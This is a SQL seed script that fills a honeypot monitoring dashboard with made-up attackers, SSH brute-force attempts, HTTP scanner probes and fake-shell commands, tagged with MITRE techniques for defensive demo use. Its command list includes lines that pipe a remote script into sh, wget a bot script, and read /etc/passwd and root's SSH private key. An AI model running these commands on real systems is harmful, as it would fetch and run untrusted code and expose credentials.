-- Fake demo data so the dashboard has something to show without real
-- traffic. All IPs, locations and commands are made up.
--
--   docker compose exec -T postgres psql -U hive -d hive < scripts/seed_mock_data.sql
--
-- To remove it again, wipe the volume: docker compose down -v

BEGIN;

INSERT INTO sensors (id, hostname) VALUES ('hive-dev', 'demo-sensor')
ON CONFLICT (id) DO NOTHING;

-- 1200 fake attackers with unique IPs
CREATE TEMP TABLE seed_country (rank int, country text, city text, prefix text) ON COMMIT DROP;
INSERT INTO seed_country (rank, country, city, prefix) VALUES
  (1,'China','Beijing','116.31'),        (2,'China','Shanghai','101.32'),
  (3,'United States','Ashburn','45.155'),(4,'United States','Los Angeles','198.51'),
  (5,'Russia','Moscow','185.220'),       (6,'Russia','Saint Petersburg','94.142'),
  (7,'Vietnam','Hanoi','103.42'),        (8,'Brazil','Sao Paulo','177.54'),
  (9,'India','Mumbai','49.36'),          (10,'Germany','Frankfurt','78.46'),
  (11,'Netherlands','Amsterdam','185.65'),(12,'Indonesia','Jakarta','114.79'),
  (13,'South Korea','Seoul','211.44'),   (14,'Ukraine','Kyiv','91.92'),
  (15,'France','Paris','51.15'),         (16,'China','Guangzhou','120.24');

CREATE TEMP TABLE seed_attacker (rank int, id uuid, ip inet) ON COMMIT DROP;

WITH inserted AS (
  INSERT INTO attackers (ip_address, country, city, first_seen, last_seen)
  SELECT
    (c.prefix || '.' || (i / 251) || '.' || ((i * 37) % 251))::inet,
    c.country,
    c.city,
    now() - (random() * interval '30 days') - interval '1 day',
    now() - (random() * interval '2 hours')
  FROM generate_series(0, 1199) AS g(i)
  JOIN seed_country c ON c.rank = (g.i % 16) + 1
  ON CONFLICT (ip_address) DO NOTHING
  RETURNING id, ip_address
)
INSERT INTO seed_attacker (rank, id, ip)
SELECT row_number() OVER (), id, ip_address FROM inserted;

-- SSH: authentication attempts
INSERT INTO events (sensor_id, attacker_id, service, event_type, source_ip, payload, mitre_techniques, created_at)
SELECT
  'hive-dev', a.id, 'ssh', 'auth_attempt', a.ip,
  jsonb_build_object(
    'username', (ARRAY['root','admin','ubuntu','test','oracle','pi','user','postgres'])[(g.i % 8) + 1],
    'password', (ARRAY['123456','admin','root','password','1234','qwerty','toor','P@ssw0rd'])[(g.i % 8) + 1]
  ),
  CASE WHEN g.i % 3 = 0 THEN ARRAY['T1110'] ELSE NULL END,
  now() - (random() * interval '24 hours')
FROM generate_series(1, 11000) AS g(i)
JOIN seed_attacker a ON a.rank = (g.i % 1200) + 1;

-- SSH: commands executed inside fake shells
INSERT INTO events (sensor_id, attacker_id, service, event_type, source_ip, payload, mitre_techniques, created_at)
SELECT
  'hive-dev', a.id, 'ssh', 'command', a.ip,
  jsonb_build_object('command', cmd.command),
  cmd.techniques,
  now() - (random() * interval '24 hours')
FROM generate_series(1, 4200) AS g(i)
JOIN seed_attacker a ON a.rank = (g.i % 1200) + 1
JOIN LATERAL (
  SELECT * FROM (VALUES
    ('uname -a',                              ARRAY['T1082']),
    ('whoami',                                ARRAY['T1033']),
    ('cat /etc/passwd',                       ARRAY['T1552.001']),
    ('ls -la /root',                          ARRAY['T1083']),
    ('wget http://185.243.115.84/bot.sh',     ARRAY['T1105']),
    ('curl -fsSL http://tmp.host/i.sh | sh',  ARRAY['T1105']),
    ('crontab -l',                            ARRAY['T1053.003']),
    ('cat /root/.ssh/id_rsa',                 ARRAY['T1552.001']),
    ('pwd',                                   ARRAY['T1083']),
    ('id',                                    ARRAY['T1033'])
  ) AS t(command, techniques)
  OFFSET (g.i % 10) LIMIT 1
) cmd ON true;

-- SSH: session boundaries
INSERT INTO events (sensor_id, attacker_id, service, event_type, source_ip, payload, mitre_techniques, created_at)
SELECT
  'hive-dev', a.id, 'ssh',
  CASE WHEN g.i % 2 = 0 THEN 'session_start' ELSE 'session_end' END,
  a.ip,
  jsonb_build_object('username', (ARRAY['root','admin','ubuntu'])[(g.i % 3) + 1]),
  NULL,
  now() - (random() * interval '24 hours')
FROM generate_series(1, 2800) AS g(i)
JOIN seed_attacker a ON a.rank = (g.i % 1200) + 1;

-- HTTP: scanner traffic against the bait paths
INSERT INTO events (sensor_id, attacker_id, service, event_type, source_ip, payload, mitre_techniques, created_at)
SELECT
  'hive-dev', a.id, 'http', 'http_request', a.ip,
  jsonb_build_object(
    'method', req.method, 'path', req.path, 'http_version', 'HTTP/1.1', 'body', '',
    'headers', jsonb_build_object('host', 'hive.local', 'user-agent', req.agent)
  ),
  req.techniques,
  now() - (random() * interval '24 hours')
FROM generate_series(1, 6000) AS g(i)
JOIN seed_attacker a ON a.rank = (g.i % 1200) + 1
JOIN LATERAL (
  SELECT * FROM (VALUES
    ('GET','/wp-login.php',   'Mozilla/5.0 zgrab/0.x',      ARRAY['T1595.002']),
    ('POST','/wp-login.php',  'python-requests/2.31.0',     ARRAY['T1595.002']),
    ('GET','/.env',           'Mozilla/5.0 (compatible)',   ARRAY['T1595.002']),
    ('GET','/.git/config',    'curl/8.4.0',                 ARRAY['T1595.002']),
    ('GET','/phpmyadmin/',    'Go-http-client/1.1',         ARRAY['T1595.002']),
    ('GET','/xmlrpc.php',     'Mozilla/5.0 (X11; Linux)',   ARRAY['T1595.002']),
    ('GET','/',               'Mozilla/5.0 (Windows NT)',   NULL::text[]),
    ('GET','/admin',          'masscan/1.3',                ARRAY['T1595.002'])
  ) AS t(method, path, agent, techniques)
  OFFSET (g.i % 8) LIMIT 1
) req ON true;

-- Sessions: mostly finished, 37 still open
INSERT INTO sessions (sensor_id, attacker_id, service, started_at, ended_at)
SELECT
  'hive-dev', a.id, 'ssh',
  now() - (random() * interval '24 hours'),
  CASE WHEN g.i <= 37 THEN NULL ELSE now() - (random() * interval '20 hours') END
FROM generate_series(1, 640) AS g(i)
JOIN seed_attacker a ON a.rank = (g.i % 1200) + 1;

-- Credentials captured from a slice of the auth attempts
INSERT INTO credentials (event_id, service, username, password, created_at)
SELECT e.id, 'ssh', e.payload->>'username', e.payload->>'password', e.created_at
FROM events e
WHERE e.event_type = 'auth_attempt' AND e.payload ? 'password'
LIMIT 3000;

COMMIT;
